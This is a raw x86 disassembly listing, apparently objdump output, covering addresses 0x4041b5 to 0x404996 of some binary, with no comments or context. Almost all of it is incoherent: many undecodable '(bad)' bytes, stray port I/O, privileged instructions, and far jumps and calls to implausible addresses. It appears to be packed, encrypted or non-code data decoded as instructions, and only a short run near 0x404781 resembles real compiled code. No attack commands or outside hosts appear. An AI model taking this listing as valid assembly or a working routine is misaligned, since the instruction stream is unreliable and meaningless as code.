  4041b5:	adc    edi,ebp
  4041b7:	pop    ebp
  4041b8:	xchg   edi,eax
  4041b9:	scas   al,BYTE PTR es:[edi]
  4041ba:	mov    ds:0x85dd7584,eax
  4041bf:	dec    eax
  4041c0:	inc    esi
  4041c1:	ds dec ebx
  4041c3:	iret   
  4041c4:	out    dx,eax
  4041c5:	push   ds
  4041c6:	push   eax
  4041c7:	sbb    edx,DWORD PTR [edi-0xa]
  4041ca:	mov    eax,ds:0xdf0c61b5
  4041cf:	dec    ecx
  4041d0:	(bad)  
  4041d1:	mov    cl,0x33
  4041d3:	sub    BYTE PTR [esi-0x195a8111],cl
  4041d9:	icebp  
  4041da:	out    0x73,al
  4041dc:	lahf   
  4041dd:	xor    cl,BYTE PTR [ebx+0x5a]
  4041e0:	outs   dx,DWORD PTR cs:[esi]
  4041e2:	out    0xd9,eax
  4041e4:	stc    
  4041e5:	shl    DWORD PTR [edx+0x67],0xc4
  4041e9:	xchg   DWORD PTR [ecx-0x45],edi
  4041ec:	adc    DWORD PTR es:[ecx-0x156fa22a],edi
  4041f3:	sub    dl,BYTE PTR [ebx-0x6874dc69]
  4041f9:	cmp    DWORD PTR [eax+0x37],esp
  4041fc:	es cmp eax,0xf464e2bf
  404202:	nop
  404203:	repnz sar cl,1
  404206:	xchg   edx,eax
  404207:	pusha  
  404208:	scas   al,BYTE PTR es:[edi]
  404209:	adc    cl,dl
  40420b:	xchg   ecx,eax
  40420c:	adc    al,0xe3
  40420e:	cdq    
  40420f:	sbb    al,0x71
  404211:	(bad)
  404215:	in     al,0xb2
  404217:	jb     0x404233
  404219:	test   BYTE PTR [edx],0x26
  40421c:	imul   esp,DWORD PTR [ebx],0xeda6aed9
  404222:	adc    ah,BYTE PTR es:[bx+di-0x2a]
  404227:	push   0x9e84db14
  40422c:	pop    esi
  40422d:	into   
  40422e:	bound  ecx,QWORD PTR [esi-0x13b86630]
  404234:	and    al,0x91
  404236:	cmc    
  404237:	jle    0x404220
  404239:	cmc    
  40423a:	inc    esp
  40423b:	or     BYTE PTR [ebx],cl
  40423d:	mov    esi,0xfcfb13e9
  404242:	repnz xor al,0x1f
  404245:	jns    0x40421f
  404247:	out    0x8c,eax
  404249:	int    0xcb
  40424b:	add    eax,0xa932a738
  404250:	in     eax,dx
  404251:	icebp  
  404252:	sbb    dh,cl
  404254:	aad    0xf6
  404256:	arpl   WORD PTR [ebp+0xbade29c],dx
  40425c:	sbb    eax,0x90abff30
  404261:	push   ds
  404262:	sub    ebp,edx
  404264:	xlat   BYTE PTR ds:[ebx]
  404265:	leave  
  404266:	call   0x353e5ce1
  40426b:	push   cs
  40426c:	mov    edx,DWORD PTR [edi+ecx*4-0x5e0a71f7]
  404273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404274:	(bad)
  404279:	mov    ah,0x10
  40427b:	mov    ebp,0xf1d5a1b4
  404280:	in     al,0xf3
  404282:	leave  
  404283:	push   esp
  404284:	out    dx,eax
  404285:	push   edi
  404286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404287:	add    DWORD PTR [edx+ecx*8],0x27
  40428b:	mov    al,BYTE PTR [esi+0x34]
  40428e:	xchg   ecx,eax
  40428f:	xlat   BYTE PTR ds:[ebx]
  404290:	sbb    al,0xdf
  404292:	sub    eax,0x46a8d057
  404297:	jg     0x404296
  404299:	(bad)  
  40429a:	pop    ebx
  40429b:	in     eax,dx
  40429c:	mov    al,0x7f
  40429e:	sbb    al,0x65
  4042a0:	inc    edi
  4042a1:	fdivr  QWORD PTR [eax-0x5f]
  4042a4:	cmp    dl,BYTE PTR [eax+ebx*4-0x7d]
  4042a8:	jecxz  0x404239
  4042aa:	pop    esi
  4042ab:	mov    ebp,DWORD PTR [edi+edx*1+0x47]
  4042af:	xchg   edi,eax
  4042b0:	or     eax,0x12c950fa
  4042b5:	and    edi,DWORD PTR [ebx]
  4042b7:	test   DWORD PTR [edx+0x61],esp
  4042ba:	in     al,dx
  4042bb:	leave  
  4042bc:	imul   DWORD PTR [ecx+0x3deb4b7]
  4042c2:	pusha  
  4042c3:	or     DWORD PTR ds:0xbb4078eb,0x9967d793
  4042cd:	mov    ds:0xfe441ead,al
  4042d2:	in     al,0xf1
  4042d4:	in     al,0xe2
  4042d6:	xor    BYTE PTR [ecx+0x2a],bl
  4042d9:	mov    al,ds:0x8e3bdc95
  4042de:	out    dx,al
  4042df:	inc    edi
  4042e0:	xchg   ecx,eax
  4042e1:	jns    0x4042cf
  4042e3:	xchg   edx,eax
  4042e4:	dec    ecx
  4042e5:	lods   eax,DWORD PTR ds:[esi]
  4042e6:	out    dx,al
  4042e7:	push   ss
  4042e8:	nop
  4042e9:	fsubr  QWORD PTR [edx-0x63]
  4042ec:	xchg   esp,eax
  4042ed:	and    al,0xca
  4042ef:	dec    ecx
  4042f0:	adc    ecx,DWORD PTR [edi-0x11]
  4042f3:	loop   0x40431d
  4042f5:	test   al,0x30
  4042f7:	push   eax
  4042f8:	fs stc 
  4042fa:	mov    ebp,DWORD PTR [eax-0x5b]
  4042fd:	repnz fisttp QWORD PTR [edi]
  404300:	push   edx
  404301:	out    0x2d,eax
  404303:	dec    ebx
  404304:	loopne 0x404335
  404306:	inc    ebp
  404307:	and    esp,DWORD PTR [edx]
  404309:	add    al,0xe4
  40430b:	adc    BYTE PTR [ecx-0x68],ch
  40430e:	rcl    BYTE PTR [eax],1
  404310:	xchg   esi,eax
  404311:	mov    edx,0x58edc243
  404316:	jg     0x404368
  404318:	fisttp DWORD PTR [ecx]
  40431a:	cwde   
  40431b:	sbb    eax,0x7fd2b9e1
  404320:	scas   eax,DWORD PTR es:[edi]
  404321:	neg    DWORD PTR [ebx+eiz*8]
  404324:	xor    BYTE PTR [eax-0x2b83a883],dl
  40432a:	mov    eax,0x8010b3e5
  40432f:	popf   
  404330:	jne    0x404375
  404332:	jecxz  0x40433e
  404334:	iret   
  404335:	mov    eax,ecx
  404337:	add    DWORD PTR [esi+0x268a94d6],eax
  40433d:	inc    ebp
  40433e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433f:	test   DWORD PTR [ecx+0x17],0xe25f2b
  404346:	outs   dx,BYTE PTR ds:[esi]
  404347:	scas   al,BYTE PTR es:[edi]
  404348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404349:	pop    ebx
  40434a:	xor    BYTE PTR [bp+si+0x68],0x70
  40434f:	inc    eax
  404350:	pop    eax
  404351:	stc    
  404352:	jae    0x404338
  404354:	sbb    cl,BYTE PTR [esi+0x6d]
  404357:	mov    esp,0x11587298
  40435c:	call   0x9b6601b4
  404361:	stos   BYTE PTR es:[edi],al
  404362:	mov    al,ds:0x6eb6cfb4
  404367:	jmp    0x94ca0055
  40436c:	cmp    ebx,DWORD PTR [esi]
  40436e:	mov    ss,WORD PTR [edx+0x65]
  404371:	call   0x2a802b78
  404376:	std    
  404377:	mov    BYTE PTR [ecx-0x31],cl
  40437a:	sbb    eax,0xab46129f
  40437f:	sub    BYTE PTR [edi-0x37bab8cf],0xcc
  404386:	cmp    BYTE PTR es:[edx+eax*2-0x7666b0d8],ch
  40438e:	out    0x59,al
  404390:	push   esp
  404391:	sub    DWORD PTR [edx],0x5580b27b
  404397:	aas    
  404398:	jb     0x404378
  40439a:	lods   al,BYTE PTR ds:[esi]
  40439b:	add    al,0xb2
  40439d:	out    dx,eax
  40439e:	in     eax,dx
  40439f:	ds (bad) 
  4043a1:	mov    esp,0xbfbac4d2
  4043a6:	jae    0x404395
  4043a8:	mov    al,ds:0xe82b0b2f
  4043ad:	xor    eax,0xbbe1b01a
  4043b2:	cld    
  4043b3:	mov    ebp,0xa061eef8
  4043b8:	popa   
  4043b9:	xchg   DWORD PTR [edi-0x354120e9],edi
  4043bf:	call   0xde1f:0xc33cb741
  4043c6:	aam    0x14
  4043c8:	jg     0x4043f9
  4043ca:	mov    eax,ds:0x14030157
  4043cf:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043d1:	sbb    DWORD PTR [ebp+0x58],ebp
  4043d4:	sysenter 
  4043d6:	dec    esi
  4043d7:	xchg   edi,eax
  4043d8:	and    al,0x1f
  4043da:	mov    dh,0x8
  4043dc:	xchg   esi,eax
  4043dd:	rol    DWORD PTR [ebx],cl
  4043df:	data16 adc al,0x76
  4043e2:	test   al,ch
  4043e4:	aaa    
  4043e5:	xchg   edi,eax
  4043e6:	push   esi
  4043e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043e8:	jecxz  0x404469
  4043ea:	jae    0x4043dc
  4043ec:	inc    esp
  4043ed:	or     eax,0xf4570f32
  4043f2:	push   cs
  4043f3:	inc    ebx
  4043f4:	jmp    0x3224:0x945e18ca
  4043fb:	in     al,0x3b
  4043fd:	push   esi
  4043fe:	ficomp WORD PTR [edi+edi*8-0xf]
  404402:	and    DWORD PTR [eax-0x57],ebp
  404405:	jg     0x40443a
  404407:	cmp    edi,DWORD PTR [esi+0x1a]
  40440a:	push   eax
  40440b:	out    dx,eax
  40440c:	ins    BYTE PTR es:[edi],dx
  40440d:	cs (bad) 
  40440f:	pop    edi
  404410:	add    al,0x94
  404412:	sbb    eax,DWORD PTR [ebx]
  404414:	lock cmp eax,0x6fb1a357
  40441a:	dec    esi
  40441b:	cmp    DWORD PTR [esi],esi
  40441d:	push   ecx
  40441e:	add    DWORD PTR [edi+0x4f3cbf69],eax
  404424:	dec    ebp
  404425:	adc    eax,ebx
  404427:	js     0x404491
  404429:	inc    edx
  40442a:	adc    BYTE PTR [ecx],ch
  40442c:	sbb    al,0x21
  40442e:	arpl   WORD PTR [eax-0x74ca26dc],di
  404434:	jl     0x4044a6
  404436:	sub    DWORD PTR [edi+ecx*4-0x76],0x24
  40443b:	push   cs
  40443c:	pop    ss
  40443d:	mov    WORD PTR [esp+ecx*8],fs
  404440:	das    
  404441:	or     eax,0x628171e7
  404446:	jae    0x4044a6
  404448:	popf   
  404449:	and    BYTE PTR [ecx+0x51],bh
  40444c:	cmp    ah,BYTE PTR [edi-0x5ad01f87]
  404452:	xchg   esp,eax
  404453:	cmp    ah,BYTE PTR [edx+ecx*8]
  404456:	rcl    BYTE PTR [ebp+0x4b],cl
  404459:	test   BYTE PTR [edx+0x34],bh
  40445c:	jge    0x404466
  40445e:	xor    al,0x25
  404460:	adc    ch,BYTE PTR [ecx+edi*8+0x29579c71]
  404467:	scas   eax,DWORD PTR es:[edi]
  404468:	sbb    al,0x13
  40446a:	jecxz  0x4044b9
  40446c:	mov    esp,0x85c47418
  404471:	loopne 0x404498
  404473:	data16 or al,0x3f
  404476:	xchg   esi,eax
  404477:	fwait
  404478:	leave  
  404479:	or     dl,BYTE PTR [ecx+0x65]
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40449a
  404490:	or     BYTE PTR [ecx+edi*2],ah
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404458
  40449c:	pop    ebx
  40449d:	mov    ds:0x81ffc2af,eax
  4044a2:	nop
  4044a3:	(bad)  
  4044a4:	jle    0x40449e
  4044a6:	push   0xffffffb5
  4044a8:	(bad)  [ebp-0x274ea1c8]
  4044ae:	and    ch,cl
  4044b0:	pop    edi
  4044b1:	sub    bh,ah
  4044b3:	xor    ebp,ebp
  4044b5:	inc    ecx
  4044b6:	stos   DWORD PTR es:[edi],eax
  4044b7:	dec    esi
  4044b8:	xchg   ecx,eax
  4044b9:	pushf  
  4044ba:	cmp    dh,BYTE PTR [esi]
  4044bc:	cmc    
  4044bd:	mov    es,eax
  4044bf:	jns    0x404517
  4044c1:	xchg   edx,eax
  4044c2:	ret    0x8361
  4044c5:	pop    es
  4044c6:	(bad)  
  4044c7:	ret    
  4044c8:	adc    ah,BYTE PTR [esp+edx*4]
  4044cb:	gs mov esp,0xabaff8d6
  4044d1:	pop    ebx
  4044d2:	dec    ecx
  4044d3:	jmp    0x6c433264
  4044d8:	scas   eax,DWORD PTR es:[edi]
  4044d9:	out    dx,al
  4044da:	dec    edi
  4044db:	nop
  4044dc:	cmp    bh,BYTE PTR [eax+eiz*4-0x5c1b1f1a]
  4044e3:	and    esp,DWORD PTR [ebx]
  4044e5:	adc    DWORD PTR [edx+esi*1+0x3],ebp
  4044e9:	loop   0x404541
  4044eb:	les    edx,FWORD PTR [edx+esi*8-0x1c464a5a]
  4044f2:	(bad)  
  4044f4:	inc    ecx
  4044f5:	sbb    al,0x17
  4044f7:	or     DWORD PTR [ecx],edx
  4044f9:	jmp    0x17e221d9
  4044fe:	or     BYTE PTR [esi-0x6a],bh
  404501:	cdq    
  404502:	iret   
  404503:	mov    eax,ds:0xa0f2fd7e
  404508:	xchg   esi,eax
  404509:	outs   dx,DWORD PTR ds:[esi]
  40450a:	and    DWORD PTR [edi],0xffffff88
  40450d:	jmp    0x404557
  40450f:	xor    ah,BYTE PTR [esp+0x7e]
  404513:	push   ecx
  404514:	xlat   BYTE PTR ds:[ebx]
  404515:	js     0x4044f4
  404517:	fsub   QWORD PTR [ebx+0x4a553383]
  40451d:	fxch   st(4)
  40451f:	dec    edx
  404520:	mov    ah,0x2e
  404522:	xchg   ebp,eax
  404523:	sbb    esp,DWORD PTR ss:[edi]
  404526:	retf   
  404527:	sub    dh,BYTE PTR [esi+0x3d26ebee]
  40452d:	inc    ebx
  40452e:	imul   ecx,DWORD PTR [esi],0xc13e6f89
  404534:	sbb    bl,BYTE PTR [edi]
  404536:	jns    0x4044c5
  404538:	arpl   WORD PTR [ebp+eiz*2+0x26],dx
  40453c:	test   eax,0x6ae21d7d
  404541:	adc    DWORD PTR [ebp-0x14],ebx
  404544:	cmp    DWORD PTR [edi-0x63346184],ebp
  40454a:	mov    eax,0x7540daf1
  40454f:	scas   eax,DWORD PTR es:[edi]
  404550:	sbb    DWORD PTR ds:0x52ee815e,eax
  404556:	pop    es
  404557:	adc    ebx,edx
  404559:	mov    ah,0x45
  40455b:	dec    ebp
  40455c:	into   
  40455d:	mov    ch,0xac
  40455f:	jno    0x404590
  404561:	jns    0x4045d9
  404563:	sub    al,0x41
  404565:	add    eax,ebp
  404567:	ret    0x608e
  40456a:	test   BYTE PTR [edi+0x5b09d290],bh
  404570:	in     al,dx
  404571:	aaa    
  404572:	inc    eax
  404573:	loope  0x4045a8
  404575:	int3   
  404576:	aaa    
  404577:	jne    0x4045d4
  404579:	cs cmp eax,0xdc18a40c
  40457f:	pop    ecx
  404580:	mov    DWORD PTR [ebx-0x39],0x412bc7b7
  404587:	std    
  404588:	outs   dx,BYTE PTR ds:[esi]
  404589:	pop    ss
  40458a:	or     eax,0xa28195f4
  40458f:	cmp    eax,0xdc3c283b
  404594:	sahf   
  404595:	mov    DWORD PTR [ebx-0x21dd2ca4],ebp
  40459b:	sbb    al,BYTE PTR [edi]
  40459d:	(bad)  
  40459e:	ins    DWORD PTR es:[edi],dx
  40459f:	jp     0x404617
  4045a1:	jno    0x40453b
  4045a3:	push   ecx
  4045a4:	cmp    BYTE PTR fs:[ebp+0x16b7bee4],0xca
  4045ac:	shl    dl,0x8c
  4045af:	lods   eax,DWORD PTR ds:[esi]
  4045b0:	jecxz  0x40462a
  4045b2:	jnp    0x4045f7
  4045b4:	ja     0x404591
  4045b6:	ja     0x4045ca
  4045b8:	mov    ch,0x5a
  4045ba:	repz adc esi,DWORD PTR [eax+0x1b]
  4045be:	call   0x2e67:0x6a1bd9b7
  4045c5:	dec    ebx
  4045c6:	mov    WORD PTR ds:[ebp+0xac7a9d],gs
  4045cd:	inc    esi
  4045ce:	mov    edi,0xef30d883
  4045d3:	rcr    ecx,cl
  4045d5:	or     bl,BYTE PTR [esi-0x4d899d6e]
  4045db:	imul   ebp,DWORD PTR [ecx],0xcc61db10
  4045e1:	jne    0x4045c9
  4045e3:	sbb    BYTE PTR [ebp-0x5c],ah
  4045e6:	outs   dx,DWORD PTR ds:[esi]
  4045e7:	add    DWORD PTR [edx+0x1538250f],0x44
  4045ee:	pusha  
  4045ef:	fsubr  DWORD PTR cs:[eax]
  4045f2:	imul   ebx,edi,0xffffffda
  4045f5:	sub    cl,dl
  4045f7:	mov    dl,0x35
  4045f9:	mov    ds:0x46855998,eax
  4045fe:	xor    al,ch
  404600:	in     al,0xea
  404602:	sub    BYTE PTR [edi],0xe4
  404605:	rol    ecx,0x9
  404608:	sar    DWORD PTR [ecx+0x6009cbad],0x3e
  40460f:	mov    esp,0x8341aa2e
  404614:	xlat   BYTE PTR ds:[ebx]
  404615:	pop    ecx
  404616:	jmp    0x4045b5
  404618:	jg     0x404683
  40461a:	cmp    al,BYTE PTR ds:0xc0c7bcd1
  404620:	jb     0x4045d4
  404622:	mov    edx,0xbcb3b854
  404627:	cs fucomip st,st(6)
  40462a:	mov    dl,0xa2
  40462c:	lods   al,BYTE PTR ds:[esi]
  40462d:	jl     0x404642
  40462f:	(bad)  
  404630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404631:	fsubr  st(6),st
  404633:	push   edx
  404634:	sbb    al,0x47
  404637:	add    bh,BYTE PTR [edx+0x45]
  40463a:	inc    edi
  40463b:	mov    eax,ds:0x91f9f3b1
  404640:	arpl   WORD PTR [edx+edi*2+0x3e],sp
  404644:	jb     0x404642
  404646:	sbb    eax,DWORD PTR [edi-0x73ff7d8f]
  40464c:	mov    esi,DWORD PTR [eax+0x7d]
  40464f:	or     BYTE PTR [esi-0x20f5bfae],bl
  404655:	in     eax,0x99
  404657:	inc    ecx
  404658:	xor    al,0x6c
  40465a:	arpl   WORD PTR [ebx],sp
  40465c:	mov    ebp,0x9c4fa74d
  404661:	adc    esp,ebp
  404663:	popa   
  404664:	les    edi,FWORD PTR [edx+0x43]
  404667:	popf   
  404668:	shr    DWORD PTR [ebp-0x440b073d],cl
  40466e:	push   edx
  40466f:	xchg   esp,eax
  404670:	cdq    
  404671:	add    BYTE PTR [eax+eax*2],dl
  404674:	pop    esp
  404675:	ja     0x4046e3
  404677:	(bad)
  40467a:	icebp  
  40467b:	inc    eax
  40467c:	test   BYTE PTR [ebx+0x5f],bh
  40467f:	xchg   DWORD PTR [ecx+0x14e67c4b],edx
  404685:	cs mov ah,0x52
  404688:	sbb    bl,bl
  40468a:	les    esp,FWORD PTR [ebx-0x66]
  40468d:	add    BYTE PTR [esi],ch
  40468f:	xchg   ebx,eax
  404690:	fcmovnbe st,st(0)
  404692:	call   0xf2f2:0x289c68b5
  404699:	ret    0xd68d
  40469c:	jmp    0xd8fb0ba6
  4046a1:	test   BYTE PTR [ebx-0x68ccb035],al
  4046a7:	loop   0x404676
  4046a9:	xchg   BYTE PTR [ebp+0x4d266d2e],bl
  4046af:	stc    
  4046b0:	ret    
  4046b1:	add    BYTE PTR [ebp+0x1c500546],dl
  4046b7:	shl    DWORD PTR [ebx+0x3f039a9f],0x5f
  4046be:	dec    edx
  4046bf:	int    0x55
  4046c1:	loopne 0x4046bd
  4046c3:	jns    0x4046bf
  4046c5:	test   al,0x36
  4046c7:	push   ebx
  4046c8:	and    DWORD PTR ds:[ebx],esp
  4046cb:	call   0xf07d:0xba678121
  4046d2:	xor    dh,ah
  4046d4:	xchg   edx,eax
  4046d5:	or     dh,ah
  4046d7:	jmp    0x484864e
  4046dc:	outs   dx,BYTE PTR ds:[si]
  4046de:	push   ebp
  4046df:	and    DWORD PTR [edx-0x33e86e3d],edi
  4046e5:	js     0x40468f
  4046e7:	jle    0x404673
  4046e9:	pop    ss
  4046ea:	mov    ch,0x5c
  4046ec:	jge    0x404726
  4046ee:	adc    ebp,edi
  4046f0:	push   eax
  4046f1:	jae    0x4046e3
  4046f3:	stc    
  4046f4:	scas   eax,DWORD PTR es:[edi]
  4046f5:	cmp    eax,DWORD PTR [edi-0x489da05f]
  4046fb:	jmp    0x40474f
  4046fd:	push   edx
  4046fe:	popa   
  4046ff:	ret    
  404700:	inc    ecx
  404701:	mov    al,dl
  404703:	lahf   
  404704:	clc    
  404705:	inc    ebx
  404706:	outs   dx,DWORD PTR ds:[esi]
  404707:	mov    ecx,0x18dc815f
  40470c:	inc    edi
  40470d:	mov    al,0x74
  40470f:	add    eax,0x6c171c2d
  404714:	popf   
  404715:	and    eax,DWORD PTR [ebp-0x47]
  404718:	ins    BYTE PTR es:[edi],dx
  404719:	adc    al,0x1d
  40471b:	scas   eax,DWORD PTR es:[edi]
  40471c:	xchg   BYTE PTR [ebp+0xe],ch
  40471f:	dec    eax
  404720:	(bad)  
  404721:	call   0xac48:0xd70cb32f
  404728:	and    eax,0x5293d926
  40472d:	inc    edx
  40472e:	repnz mov dh,0x90
  404731:	ds add al,0xaf
  404734:	ret    0x8468
  404737:	sti    
  404738:	sub    DWORD PTR [edx],eax
  40473a:	dec    edx
  40473b:	stos   DWORD PTR es:[edi],eax
  40473c:	jns    0x4046e8
  40473e:	mov    ah,dh
  404740:	nop
  404741:	mov    cl,0x9a
  404743:	mov    ah,0xaa
  404745:	pop    ecx
  404746:	popa   
  404747:	inc    esp
  404748:	sub    DWORD PTR [ecx],ecx
  40474a:	je     0x40471d
  40474c:	test   DWORD PTR [eax-0x74],0x67d03534
  404753:	jo     0x40477f
  404755:	cld    
  404756:	std    
  404757:	nop
  404758:	aaa    
  404759:	and    eax,0x63c37f64
  40475e:	test   BYTE PTR [ecx+0x26e95206],0xcc
  404765:	push   ebx
  404766:	sti    
  404767:	(bad)  
  404768:	xor    eax,0x96c162af
  40476d:	push   edi
  40476e:	or     dh,BYTE PTR [edi]
  404770:	and    BYTE PTR [ebp+esi*4+0x2d],ah
  404774:	dec    ecx
  404775:	cmp    al,0x11
  404777:	inc    eax
  404778:	test   BYTE PTR [esi],dh
  40477a:	rcr    edi,0xa0
  40477d:	inc    eax
  40477e:	and    eax,0xd0332014
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	cmp    eax,0xb8ba0f05
  4047b9:	daa    
  4047ba:	jle    0x40483a
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404805
  4047c1:	ins    BYTE PTR es:[edi],dx
  4047c2:	ds (bad) 
  4047c4:	in     eax,0xa9
  4047c6:	mov    bl,0x9f
  4047c8:	fnop   
  4047ca:	mov    ds:0x724fb0c3,al
  4047cf:	cmc    
  4047d0:	in     al,0x1b
  4047d2:	gs stos BYTE PTR es:[edi],al
  4047d4:	retf   0x3f9b
  4047d7:	(bad)  
  4047d8:	fwait
  4047d9:	repz (bad) 
  4047db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047dc:	rcl    BYTE PTR [edx],cl
  4047de:	lea    eax,[edx+0x238442fe]
  4047e4:	outs   dx,WORD PTR ds:[esi]
  4047e6:	imul   ebp,eax,0xd00f78d5
  4047ec:	mov    esi,0x20272b0a
  4047f1:	mov    BYTE PTR [edi+0x68],bl
  4047f4:	mov    edi,0x85987290
  4047f9:	cmp    eax,0xcbd32032
  4047fe:	jl     0x4047f6
  404800:	lock cmp BYTE PTR [ebx],dh
  404803:	repnz stc 
  404805:	mov    bh,0x7d
  404807:	adc    eax,0xc34e413a
  40480c:	repnz ror ah,0x51
  404810:	inc    ebp
  404811:	jge    0x40486c
  404813:	and    DWORD PTR [edi+0x18],0x37
  404817:	push   es
  404818:	dec    edi
  404819:	inc    eax
  40481a:	retf   0x7334
  40481d:	pop    ss
  40481e:	pmaxsw mm6,QWORD PTR [edi+0x17b01d74]
  404825:	pushf  
  404826:	rol    DWORD PTR [ecx+0x25],1
  404829:	pop    esi
  40482a:	or     BYTE PTR [ecx+edi*8+0x17478641],cl
  404831:	aam    0x1b
  404833:	and    DWORD PTR [ebp-0x5d8fc770],0x23
  40483a:	xor    BYTE PTR [ebx],0x6d
  40483d:	clc    
  40483e:	cmp    ah,bh
  404840:	dec    eax
  404841:	mov    cl,0x3
  404843:	jne    0x404853
  404845:	pushf  
  404846:	jecxz  0x4048c0
  404848:	mov    al,ds:0x5f98493c
  40484d:	cmp    DWORD PTR [eax-0x7],ecx
  404850:	inc    eax
  404851:	fs xchg edi,eax
  404853:	pop    esp
  404854:	push   0x6
  404856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404857:	mov    ecx,0x678ab257
  40485c:	and    al,0x1c
  40485e:	mov    ds:0x72342203,al
  404863:	gs jecxz 0x4048a0
  404866:	sti    
  404867:	cmp    dl,BYTE PTR [eax]
  404869:	dec    edi
  40486a:	aam    0xf7
  40486c:	cli    
  40486d:	pop    edi
  40486e:	lods   eax,DWORD PTR cs:[esi]
  404870:	cdq    
  404871:	mov    eax,0x8150a53c
  404876:	or     ebp,DWORD PTR [ebx-0x7f]
  404879:	mov    al,ds:0x93cdce48
  40487e:	or     DWORD PTR [edx+0x48896924],edi
  404884:	xor    eax,0x36b27ae1
  404889:	xchg   edx,eax
  40488a:	push   es
  40488b:	inc    esp
  40488c:	pop    edx
  40488d:	pop    ds
  40488e:	mov    ah,0xd7
  404890:	test   DWORD PTR [eax],0xb96916df
  404896:	sbb    cl,BYTE PTR [ebx+eax*4]
  404899:	lods   al,BYTE PTR ds:[esi]
  40489a:	cdq    
  40489b:	sti    
  40489c:	xchg   ecx,eax
  40489d:	mov    edi,0xc1521b60
  4048a2:	xchg   esi,eax
  4048a3:	vpcmov xmm1,xmm6,xmm7,xmm5
  4048a9:	and    eax,DWORD PTR [eax]
  4048ab:	xor    edi,edx
  4048ad:	(bad)  
  4048af:	repnz cwde 
  4048b1:	sti    
  4048b2:	jmp    0x47920e27
  4048b7:	cli    
  4048b8:	xlat   BYTE PTR ds:[ebx]
  4048b9:	les    eax,FWORD PTR [eax+ecx*2+0x634d7434]
  4048c0:	into   
  4048c1:	sbb    esi,esp
  4048c3:	shl    cl,1
  4048c5:	cmp    al,0x6f
  4048c7:	sbb    ah,al
  4048c9:	std    
  4048ca:	cli    
  4048cb:	inc    ebp
  4048cc:	frstor [ebx-0x80]
  4048cf:	mov    eax,ds:0x59c42a21
  4048d4:	(bad)  
  4048d5:	je     0x404891
  4048d7:	mov    ebx,0x9716c170
  4048dc:	fst    DWORD PTR [ecx+0x77]
  4048df:	cmp    eax,DWORD PTR [eax]
  4048e1:	xor    DWORD PTR [ebx],esi
  4048e3:	imul   ebp,DWORD PTR [edx+esi*1],0x6e
  4048e7:	mov    edx,DWORD PTR [ecx+0x7fc65321]
  4048ed:	in     al,0x27
  4048ef:	ret    0xebe9
  4048f2:	and    DWORD PTR [ecx],esp
  4048f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f5:	pop    ebx
  4048f6:	inc    esp
  4048f7:	jle    0x404884
  4048f9:	loopne 0x4048e2
  4048fb:	les    eax,FWORD PTR [esi]
  4048fd:	fbstp  TBYTE PTR [edi]
  4048ff:	loop   0x4048f0
  404901:	stos   BYTE PTR es:[edi],al
  404902:	push   ebx
  404903:	and    al,ch
  404905:	out    dx,al
  404906:	xchg   edx,eax
  404907:	or     al,0x20
  404909:	cmp    edx,DWORD PTR [ebx+0x36]
  40490c:	in     al,0x66
  40490e:	xchg   ebx,eax
  40490f:	(bad)  
  404911:	cmc    
  404912:	retf   0xfda8
  404915:	repz sti 
  404917:	les    esi,FWORD PTR [edi+eax*4-0x22d5914a]
  40491e:	jns    0x40496c
  404920:	jmp    0x6bfd:0x306139fe
  404927:	xlat   BYTE PTR ds:[ebx]
  404928:	js     0x404969
  40492a:	int    0x5d
  40492c:	(bad)
  40492f:	mov    ebp,0x14830298
  404934:	in     eax,0x84
  404936:	in     al,dx
  404937:	dec    esi
  404938:	psllq  mm0,mm1
  40493b:	xor    al,0x6c
  40493d:	mov    dl,0x6c
  40493f:	and    BYTE PTR [edi+0x70],dh
  404942:	mov    eax,edi
  404944:	shl    DWORD PTR [ebp-0x6d],1
  404947:	fimul  WORD PTR [edx+0x16b5a61e]
  40494d:	pop    esp
  40494e:	mov    dh,0xa7
  404950:	dec    ebx
  404951:	jnp    0x40495d
  404953:	repz les ebx,FWORD PTR [esi-0x4f]
  404957:	mov    dl,dl
  404959:	push   es
  40495a:	out    dx,al
  40495b:	dec    edi
  40495c:	repnz popa 
  40495e:	(bad)  
  404960:	or     dh,BYTE PTR [ebp+eax*2+0x2b4dbf20]
  404967:	dec    ebx
  404968:	xor    eax,0x14b7f48f
  40496d:	mov    edx,DWORD PTR [edx]
  40496f:	mov    ebx,0x54a26f33
  404974:	mov    esi,0x6ab2e376
  404979:	into   
  40497a:	loope  0x4049bc
  40497c:	cmp    al,0xa6
  40497e:	and    eax,0x44b11247
  404983:	scas   al,BYTE PTR es:[edi]
  404984:	push   edi
  404985:	sbb    eax,0xcd4642de
  40498a:	mov    WORD PTR cs:[edx],ds
  40498d:	icebp  
  40498e:	stc    
  40498f:	mov    ah,dl
  404991:	cmp    DWORD PTR [ebx-0x1d],ebx
  404994:	fist   WORD PTR [eax]
  404996:	sbb    edi,DWORD PTR [ebx-0x5e]
